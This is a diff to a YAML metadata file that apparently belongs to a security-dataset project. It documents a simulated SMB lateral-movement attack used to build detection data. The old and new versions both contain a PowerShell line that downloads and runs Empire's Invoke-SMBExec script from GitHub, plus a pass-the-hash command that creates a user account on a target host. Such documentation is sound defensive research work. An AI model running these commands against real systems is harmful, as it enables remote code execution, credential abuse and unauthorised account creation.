@@ -47,17 +47,13 @@ datasets:
       link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-RemoteServiceCreation-RPCOverSMB/WORKSTATION6_Windows_PCAP.zip
 
 simulation:
-  environment: Mordor shire
-  tools:
-    - type: Manual
-      name: PowerShell
-      module: PowerShell
-      script: https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/lateral_movement/Invoke-SMBExec.ps1
-  permissions_required:
-    - Administrator 
-  adversary_view: |-
-    PS C:\Windows\system32> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/lateral_movement/Invoke-SMBExec.ps1')
-    PS C:\Windows\system32>
-    PS C:\Windows\system32> Invoke-SMBExec -Target 192.168.2.4 -Domain mssentinel.local -Username pgustavo -Hash $hash -Command "net user SMBExec Fall2022 /add"
+  executor: PowerShell
+  scriptUri: https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/lateral_movement/Invoke-SMBExec.ps1
+  supportingFileUris:
+  commands: |-
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/lateral_movement/Invoke-SMBExec.ps1')
+    Invoke-SMBExec -Target 192.168.2.4 -Domain mssentinel.local -Username pgustavo -Hash $hash -Command "net user SMBExec Fall2022 /add"
+  output: |-
     Command executed with service UNJRBWVOFQMMTPMFOUCO on 192.168.2.4
-    PS C:\Windows\system32>
+
+detection:
